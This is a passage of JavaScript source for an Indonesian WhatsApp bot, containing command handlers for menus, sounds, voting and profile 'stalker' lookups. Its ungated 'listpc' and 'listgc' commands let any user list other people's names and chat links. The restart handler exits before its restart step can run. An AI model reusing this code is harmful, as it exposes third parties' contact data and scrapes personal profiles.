                NFSBotInc.public = true
                replygcNFS('*Berhasil Mengubah Ke Penggunaan Publik*')
            }
            break
            case 'self': {
                if (!NFSTheCreator) return NFSStickOwner()
                NFSBotInc.public = false
                replygcNFS('*Berhasil Mengubah Ke Pemakaian Sendiri*')
            }
            break
case 'rentbot': {
if (m.isGroup) return NFSStickPrivate()
if (!NFSTheCreator) return NFSStickOwner()
rentfromNFS(NFSBotInc, m, from)
}
break
case 'rentbotlist':
try {
let user = [... new Set([...global.conns.filter(NFSBotInc => NFSBotInc.user).map(NFSBotInc => NFSBotInc.user)])]
te = "*Daftar Renbot*\n\n"
for (let i of user){
y = await NFSBotInc.decodeJid(i.id)
te += " × Pengguna : @" + y.split("@")[0] + "\n"
te += " × Nama : " + i.name + "\n\n"
}
NFSBotInc.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
replygcNFS(`Belum ada pengguna yang menyewa bot`)
}
break
case 'shutdown':
if (!NFSTheCreator) return NFSStickOwner()
replygcNFS(`Bot telah di matikan...`)
await sleep(3000)
process.exit()
break
case 'restart': {
if (!NFSTheCreator) return NFSStickOwner()
replygcNFS(`Bot akan di mulai ulang...`)
await sleep(3000)
process.exit()
exec("npm start", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`)
        return
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`)
        return
    }
    console.log(`stdout: ${stdout}`)
})
}
break
case 'owner': {
const repf = await NFSBotInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
NFSBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Ini pemilikku yang tampan😇`, mentions: [sender]}, { quoted: repf })
}
break
case 'alive': case 'panel': case 'list': case 'menu': case 'help': case '?': {
	        let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let timestampe = speed()
            let latensie = speed() - timestampe
            NFSezy = `◈ ━━━━━ *𝗡𝗙𝗦  ┃ ᴮᴼᵀ* ━━━━━ ◈
*${NFSytimewisher} ${pushname}. Saya adalah bot WhatsApp otomatis yang dapat membantu melakukan sesuatu, mencari dan mendapatkan data atau informasi melalui WhatsApp.*

┌─ ❖「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧」❖
│
│𝗞𝗲𝗰𝗲𝗽𝗮𝘁𝗮𝗻 : ${latensie.toFixed(4)} miliseconds
│𝗪𝗮𝗸𝘁𝘂 𝗔𝗸𝘁𝗶𝗳 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 : ${global.botname}
│𝗣𝗲𝗻𝗴𝗲𝗺𝗯𝗮𝗻𝗴 : ${global.ownername}
│𝗡𝗼𝗺𝗲𝗿 : +${ownernumber}
│𝗣𝗿𝗲𝗳𝗶𝘅 : NO-PREFIX
│𝗠𝗼𝗱𝗲 : ${NFSBotInc.public ? 'Public' : `Pribadi`}
│𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${global.hostname}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│
└─ ❖「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❖
│
│𝗡𝗮𝗺𝗮 : ${pushname}
│𝗡𝗼𝗺𝗲𝗿 : @${me.split('@')[0]}
│𝗦𝘁𝗮𝘁𝘂𝘀 : ${isPrem ? 'Premium ✔️' : `Terbatas ⛔`}
│
└─ ❖「 𝗜𝗡𝗙𝗢 𝗪𝗔𝗞𝗧𝗨 」❖
│
│𝗝𝗮𝗺 : ${xtime}
│𝗧𝗮𝗻𝗴𝗴𝗮𝗹 : ${xdate}
│
└┬────────────┈ ⳹
   │✑「 𝗠𝗘𝗡𝗨 」
┌└─────────────┈ ⳹
│❏.allmenu
│❏.downloadmenu
│❏.funmenu
│❏.aimenu
│❏.groupmenu
│❏.ownermenu
│❏.photooxymenu
│❏.textpromenu
│❏.ephoto360menu
│❏.animemenu
│❏.nsfwmenu
│❏.randomphotomenu
│❏.randomvideomenu
│❏.stickermenu
│❏.databasemenu
│❏.stalkermenu
│❏.bugmenu
│❏.othermenu
└─────────────────┈ ⳹`
            let ments = [ownernya, me, mark]        
           NFSBotInc.sendMessage(from, { 
text: NFSezy,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
           }
           break
case 'allmenu': {
var unicorn = await getBuffer(picak+'All Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${allmenu(prefix, hituet)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'ownermenu': {
var unicorn = await getBuffer(picak+'Owner Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${ownermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'othermenu': {
	var unicorn = await getBuffer(picak+'Other Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${othermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'downloadmenu': {
var unicorn = await getBuffer(picak+'Download Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${downloadmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'groupmenu': {
var unicorn = await getBuffer(picak+'Group Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${groupmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'funmenu': {
var unicorn = await getBuffer(picak+'Fun Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${funmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'stalkermenu': {
var unicorn = await getBuffer(picak+'Stalker Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'randomphotomenu': {
var unicorn = await getBuffer(picak+'Random Pic Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${randphotomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'randomvideomenu': {
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${randvideomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'textpromenu': {
var unicorn = await getBuffer(picak+'Textpro Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'photooxymenu': {
var unicorn = await getBuffer(picak+'Photooxy Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'ephoto360menu': {
var unicorn = await getBuffer(picak+'Photo360 Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'nsfwmenu': {
var unicorn = await getBuffer(picak+'Anime NSFW Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${nsfwmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'animemenu': {
var unicorn = await getBuffer(picak+'Anime Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${animemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'stickermenu': {
var unicorn = await getBuffer(picak+'Sticker Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${stickermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'databasemenu': {
var unicorn = await getBuffer(picak+'Database Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${databasemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'aimenu': {
var unicorn = await getBuffer(picak+'OpenAI Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${aimenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'bugmenu': {
var unicorn = await getBuffer(picak+'Bug Menu')
sendNFSBotIncMessage(from, { 
text: `Hi @${sender.split("@")[0]}\n\n${bugmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
NFSBotInc_dev = await getBuffer(`https://github.com/Blawuken/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await NFSBotInc.sendMessage(m.chat, { audio: NFSBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{

let teman = pickRandom(NFSverifieduser)
setTimeout(() => {
NFSStickWait()
}, 1000)
setTimeout(() => {
replygcNFS('Berhasil Mendapatkan Satu Orang')
}, 5000)
setTimeout(() => {
NFSBotInc.sendMessage(from, {text: `Di Sini @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'cekbot': case 'sourcecode': {
let me = m.sender
teks = `*「  ${global.botname} Script 」*

Halo @${me.split('@')[0]} 👋
Jangan lupa donasi ya 🍜

*Dana* : 089629929193
*Ovo* : 089629929193

Facebook : ${global.websitex}
GitHub : ${global.botscript}
WhatsApp : +${global.ownernumber}`
sendNFSBotIncMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./NFSMedia/theme/donate.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'request': case 'reportbug': {
	if (!text) return replygcNFS(`*Contoh :* ${prefix + command} Hi Dev perintah play tidak berfungsi`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},Permintaan Anda telah diteruskan ke Pemilik saya*.\n*Harap tunggu...*`
            for (let i of owner) {
                NFSBotInc.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            NFSBotInc.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
case 'q': case 'quoted': {
if (!m.quoted) return replygcNFS('Tolong Balas Pada Pesan!!')
let NFSquotx= await NFSBotInc.serializeM(await m.getQuotedObj())
if (!NFSquotx.quoted) return replygcNFS('Pesan yang Anda balas tidak dikirim oleh bot')
await NFSquotx.quoted.copyNForward(m.chat, true)
}
break
case 'igstalk2':{

if (!q) return replygcNFS(`*Contoh* : ${prefix+command} anggit0817`)
NFSStickWait()
const aj = await igstalk(`${q}`)
NFSBotInc.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Penguntit \\*

Nama lengkap : ${aj.fullname}
Nama belakang : ${aj.username}
Post : ${aj.post}
Pengikut : ${aj.followers}
Mengikuti : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{

if (!q) return replygcNFS(`*Contoh* : ${prefix+command} 946716486`)
NFSStickWait()
eeh = await ffstalk.ffstalk(`${q}`)
replygcNFS(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {

if (!q) return replygcNFS(`Example ${prefix+command} 530793138|8129`)
NFSStickWait()
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcNFS(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
if (!q) return replygcNFS(`Example ${prefix+command} NFSapi`)
NFSStickWait()
eha = await npmstalk.npmstalk(q)
replygcNFS(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcNFS(`Example ${prefix+command} Blawuken`)
NFSStickWait()
aj = await githubstalk.githubstalk(`${q}`)
NFSBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'ss': case 'ssweb': {
if (!q) return replygcNFS(`Example ${prefix+command} link`)
NFSStickWait()
let krt = await scp1.ssweb(q)
NFSBotInc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'join': {
if (!NFSTheCreator) return NFSStickOwner()
if (!text) return replygcNFS(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcNFS('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await NFSBotInc.groupAcceptInvite(result)
await replygcNFS(`Done`)
}
break
case 'poll': {
	if (!NFSTheCreator) return NFSStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcNFS(
                    `Sebutkan pertanyaan dan minimal 2 opsi\n*Contoh :* ${prefix}poll Apa aku ganteng?|Ya,Tidak,Sangat Jelek...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await NFSBotInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
        case 'vote': {
            if (!m.isGroup) return NFSStickGroup()
            if (m.chat in vote) return replygcNFS(`_Masih ada suara di obrolan ini!_\n\n*${prefix}deletevote* - untuk menghapus suara`)
            if (!text) return replygcNFS(`Masukkan Alasan Memilih, Contoh: *${prefix + command} Pemilik Tampan*`)
            replygcNFS(`Pemungutan suara dimulai!\n\n*${prefix}upvote* - untuk upvote\n*${prefix}downvote* - untuk downvote\n*${prefix}checkvote* - untuk memeriksa vote\n*${prefix}deletevote* - untuk hapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Silakan Ketik Di Bawah Ini
*${prefix}upvote* - untuk menaikan vote
*${prefix}downvote* -  untuk menurunkan vote
*${prefix}deletevote* - untuk hapus vote`
            NFSBotInc.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return NFSStickGroup()
            if (!(m.chat in vote)) return replygcNFS(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcNFS('Anda telah Memilih')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            NFSBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return NFSStickGroup()
            if (!(m.chat in vote)) return replygcNFS(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcNFS('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            NFSBotInc.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return NFSStickGroup()
if (!(m.chat in vote)) return replygcNFS(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${NFSBotInc.user.id}
`
NFSBotInc.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return NFSStickGroup()
            if (!(m.chat in vote)) return replygcNFS(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcNFS('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replygcNFS(`Reply Image/Video`)
NFSStickWait()
if (/image/.test(mime)) {
anuan = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
NFSBotInc.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
NFSBotInc.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replygcNFS(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcNFS(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
            case 'listpc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 NFSBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await NFSBotInc.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 NFSBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
